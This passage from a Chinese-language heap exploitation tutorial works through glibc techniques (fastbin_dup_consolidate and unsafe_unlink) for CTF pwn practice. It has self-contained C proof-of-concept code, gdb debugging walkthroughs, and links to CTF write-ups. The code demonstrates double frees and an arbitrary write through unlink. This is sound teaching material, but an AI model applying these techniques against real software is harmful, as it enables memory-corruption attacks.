                ><br>此时fastbin结构，再次形成BAB结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KSXPFGVAYV5H9YZ.png"
                      alt="图片描述"
                ><br>此时a和c指向同一地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4MZWDG2C8F3WEA.png"
                      alt="图片描述"
                ></p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p1 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p4 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04编译并使用pwncli改写rpath。
</code></pre>
<h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><p>calloc p1堆块后，在0x4006C5处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KQEQ32B3NMRVFSC.png"
                      alt="图片描述"
                ><br>查看堆结构， 可以看到多出来一块0x411大小的堆块。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PVC2FBRWP9GF7A.png"
                      alt="图片描述"
                ><br>这个堆块是puts的缓冲区。puts函数用于将字符串输出到标准输出流（stdout），而标准输出流是一个文件流，需要在内存中分配一块缓冲区来存储输出的字符串，下图是其分配过程。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XG85YQF9NY28T7S.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6QS2Z3FCJEQPXMR.png"
                      alt="图片描述"
                ><br>free(p1)后，p1会优先进入fastbins。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YG6FJ2KF3VB4U26.png"
                      alt="图片描述"
                ><br>再次申请0x400（实际大小为0x410）的chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Y7DJTKGEFQFGFGA.png"
                      alt="图片描述"
                ><br>在gdb里s步入调试，可以看到触发了malloc_consolidate机制。原因如下，因为libc再分配large chunk时，fastbin中有p1这个chunk存在，所以会调用malloc_consolidate()函数整合fastbins中的chunk，并放入unsorted bin或top_chunk;然后unsorted bin中的chunk又会被取出放入各自对应的bins。(这个bins为small bin和large bin。这也是chunk唯一进入small bin和large bin的机会)。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VXYWCAM8E85E5V6.png"
                      alt="图片描述"
                ><br>malloc_consolidate()函数执行完以后，因为p1与top_chunk相邻，所以p1被合并到了top_chunk。top_chunk的基址也变成了p1的prev_size的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6AUFTSRX2JMSNHZ.png"
                      alt="图片描述"
                ><br>然后malloc函数会从top_chunk获取chunk，那么p1的地址就已经和p3指向同一块地址了。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R2MJEDKJDC62ZD.png"
                      alt="图片描述"
                ><br>此时再次free(p1)，在0x40076c处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3UFBHGTKF3NW24D.png"
                      alt="图片描述"
                ><br>由于p1和p3指向同一个大小为0x411的chunk,而这个chunk又和top_chunk相邻，所以会再次被合并到top_chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K9CV7KXXVU9UMNW.png"
                      alt="图片描述"
                ><br>如果这个时候，我们再次申请一个chunk，在0x40077A处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_38SFMRQ5X3FR7A5.png"
                      alt="图片描述"
                ><br>那么这个chunk的地址还会与p1 &amp;&amp; p3的地址一样。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4AUY3TB9B4HUMEM.png"
                      alt="图片描述"
                ><br>至此p1,p3,p4指向了同一块chunk。</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	<span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当然，其实chunk0_ptr并不一定是一个全局指针。以下代码在glibc2.23依然起作用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>;</span><br><span class="line">	<span class="type">uint64_t</span>* ptr0 = (<span class="type">uint64_t</span>*)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">	<span class="type">uint64_t</span>* ptr1 = (<span class="type">uint64_t</span>*)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">	ptr0[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;ptr0 - <span class="number">3</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">	ptr0[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;ptr0 - <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="type">uint64_t</span>* ptr1_head = (<span class="type">uint64_t</span>)ptr1 - <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">	ptr1_head[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	ptr1_head[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">free</span>(ptr1);</span><br><span class="line">	<span class="type">char</span> victim[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	ptr0[<span class="number">3</span>]=(<span class="type">uint64_t</span>)victim;</span><br><span class="line">	ptr0[<span class="number">0</span>] = <span class="number">0x4141414141</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,victim);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04编译并使用第一个源码pwncli改写rpath。
</code></pre>
<p>   简单介绍一下unlink，<a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/" >CTF Wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>里有介绍，简单总结如下：</p>
<pre><code>1，首先找到要进行unlink的chunk(这里记为P)的前后堆块，
   FD = P-&gt;fd, BK = P-&gt;bk。
2，进行安全检查，glibc2.23的潦草判断条件如下
   FD-&gt;bk == P, BK-&gt;fd == P。
3，然后执行FD-&gt;bk=BK, BK-&gt;fd=FD。
4，当某个non-fast大小的chunk被释放时，就会根据PREV_INUSE位检查其前后堆块是否处于释放状态，如果是就会将前面或后面的堆块取出并与当前堆块合并。取出前面或后面的堆块P的过程就是unlink。
</code></pre>
<h3 id="调试-6"><a href="#调试-6" class="headerlink" title="调试"></a>调试</h3><p>首先申请两块smallbin_chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6ZP8PYCJCE35KDG.png"
                      alt="图片描述"
                ><br>为了绕过unlink检查，这里将全局的chunk0_ptr+0x10(chunk0_ptr[2])处的内容改为chunk0_ptr-0x18的地址，注意这里chunk0_ptr[2]指向的是全局变量的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XTHTCK8EQSMAX6B.png"
                      alt="图片描述"
                ><br>同样，接下来将chunk0_ptr[3]的内容改为chunk0_ptr-0x10的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2GFDGPT8AB5TCPM.png"
                      alt="图片描述"
                ><br>chunk0_ptr位置在bss节。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2QDW7TADTJ8F9YD.png"
                      alt="图片描述"
                ></p>
<p>此时chunk0的堆结构。可以看到chunk0_ptr指向chunk0_fd(0x603010)的位置。chunk0_fd_nextsize和chunk0_bk_nextsize已被修改为全局变量（bss节）处的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_T7ZZAKUECF646WZ.png"
                      alt="图片描述"
                ><br>用图来表示如下<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NXQ9YXPN542KB5K.png"
                      alt="图片描述"
                ></p>
<p>接下来cdqe指令将EAX寄存器中的DWORD(32 位值)符号扩展为RAX寄存器中的 QWORD(64 位值)。然后利用shl指令逻辑左移三位，再利用neg指令求补。最后也就是将chunk1_hdr的内容改为chunk1_ptr-2（chunk1_prev_size）的地址。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JG8ZQB8MH2YV68Q.png"
                      alt="图片描述"
                ></p>
<p>接下来将chunk1_hdr[0]改为0x80大小，也就是chunk1的prev_size位变为0x80。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JN69YNASY7MKFCK.png"
                      alt="图片描述"
                ></p>
<p>然后利用and指令（与运算有零则零）把chunk1_hdr+1也就是chunk1_size的PREV_INUSE位改为0。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_BGBDQAVWY7R26XR.png"
                      alt="图片描述"
                ></p>
<p>现在堆结构如图。因为chunk_prev_size&#x3D;0x80,所以P_chunk如下<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PZ9JU3KFW6NJN5P.png"
                      alt="图片描述"
                ></p>
<p>然后把chunk1给free()掉因为其PREV_INUSE为0，又是small bin大小，触发unlink，要将P这个fake chunk摘除。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VY24BDSZW5SQSWA.png"
                      alt="图片描述"
                ><br>那么此时FD&#x3D;P-&gt;FD和BK&#x3D;P-&gt;bk，FD-&gt;bk &#x3D;&#x3D; P, BK-&gt;fd &#x3D;&#x3D; P。可以能够看到成功绕过glibc2.23检查。注意，我画的时候是根据布局画的，堆由低向高地址增长（由高向低画），bss由低向高画的。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3KAA3VZEGWRQ2CF.png"
                      alt="图片描述"
                ></p>
<p>接下来执行 两步操作 FD-&gt;bk&#x3D;BK, BK-&gt;fd&#x3D;FD。FD和BK只相差0x8字节大小。第一步会把chunk0_ptr指向低0x10字节处（0x602068），第二步把chunk0_ptr指向低0x18字节处（0x602060），最终chunk0_ptr指向了0x602060处。chunk0_ptr &#x3D; 0x602060，我们向chunk0_ptr写入内容时就会从0x602060开始向高地址写，我们发现，写到高0x18时，写到了我们保存写入地址指针的地址，这个地址(chunk0_ptr的物理地址0x602078)存储的地址(0x602060)就是我们开始写的地址，也就是chunk0_ptr指向的地址。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3G6W8HPTPJYVXXM.png"
                      alt="图片描述"
                ><br>可以看到，<code>chunk0_ptr</code>指向的地址由<code>*chunk0_ptr-0x18</code>保存，修改<code>*chunk0_ptr-0x18</code>存储的地址(0x602060)，也就修改了写入的起始地址，也就是chunk0_ptr指向的地址，我们会从这个新地址重新开始写，也就达到了任意地址写的效果。这只是其中一种用法，建议看例题来加深理解。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4A4TPGFMMJSRUCR.png"
                      alt="图片描述"
                ><br>我们也可以通过从0x602060开始向高地址覆盖，覆盖到0x602078处时，修改这里保存的地址，然后下次写时就会从修改的这个新地址开始写入。</p>
<h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><ul>
<li><p>off-by-one<br><a class="link"   href="https://www.52pojie.cn/thread-1825637-1-1.html" >ASIS CTF 2016 : b00ks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1828172-1-1.html" >Plaid CTF 2015 : PlaidDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1828388-1-1.html" >SECCON CTF 2016 : tinypad <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.52pojie.cn/thread-1836790-1-1.html" >BCTF 2016 : bcloud <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>overlapping chunk<br><a class="link"   href="https://www.52pojie.cn/thread-1833414-1-1.html" >0CTF 2018 : babyheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1833578-1-1.html" >hack.lu CTF 2015 : bookstore <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
